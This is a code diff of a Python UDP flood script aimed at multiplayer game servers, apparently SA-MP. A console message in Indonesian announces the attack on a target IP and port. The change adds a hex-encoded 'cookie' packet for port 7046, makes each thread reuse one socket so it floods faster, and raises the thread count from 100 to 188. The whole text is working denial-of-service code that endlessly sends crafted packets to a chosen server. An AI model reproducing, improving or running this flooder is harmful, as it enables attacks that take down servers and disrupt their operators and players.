@@ -23,6 +23,7 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("021efd40","hex_codec"),#cookie port 7784
                        codecs.decode("021efd40","hex_codec"),#cookie port 1111 
                        codecs.decode("081e1b8a","hex_codec"),#cookie port 7050
+                       codecs.decode("081e1b86","hex_codec"),#cookie port 7046
                        codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
                        ]
 
@@ -36,34 +37,33 @@ print("Melakukan serangan terhadap IP: %s PORT: %s"%(orgip,port))
 
 
 class MyThread(threading.Thread):
-     def run(self):
-         while True:
-                sock = socket.socket(
-                    socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP
-                
-                msg = Pacotes[random.randrange(0,3)]
-                     
-                sock.sendto(msg, (ip, int(port)))
+    def run(self):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # sekali buat
+        while True:
+            msg = Pacotes[random.randrange(0, 3)]
+            sock.sendto(msg, (ip, int(port)))
                 
                 
-                if(int(port) == 7777):
-                    sock.sendto(Pacotes[5], (ip, int(port)))
-                elif(int(port) == 7796):
-                    sock.sendto(Pacotes[4], (ip, int(port)))
-                elif(int(port) == 7771):
-                    sock.sendto(Pacotes[6], (ip, int(port)))
-                elif(int(port) == 7784):
-                    sock.sendto(Pacotes[7], (ip, int(port)))
-                elif(int(port) == 1111):
-                    sock.sendto(Pacotes[9], (ip, int(port)))
-                elif(int(port) == 7050):
-                    sock.sendto(Pacotes[10], (ip, int(port)))
+            if(int(port) == 7777):
+                sock.sendto(Pacotes[5], (ip, int(port)))
+            elif(int(port) == 7796):
+                sock.sendto(Pacotes[4], (ip, int(port)))
+            elif(int(port) == 7771):
+                sock.sendto(Pacotes[6], (ip, int(port)))
+            elif(int(port) == 7784):
+                sock.sendto(Pacotes[7], (ip, int(port)))
+            elif(int(port) == 1111):
+                sock.sendto(Pacotes[9], (ip, int(port)))
+            elif(int(port) == 7050):
+                sock.sendto(Pacotes[10], (ip, int(port)))
+            elif(int(port) == 7046):
+                sock.sendto(Pacotes[11], (ip, int(port)))
     
                 
 
 if __name__ == '__main__':
     try:
-     for x in range(100):                                    
+     for x in range(188):                                    
             mythread = MyThread()  
             mythread.start()                                  
             time.sleep(.1)    
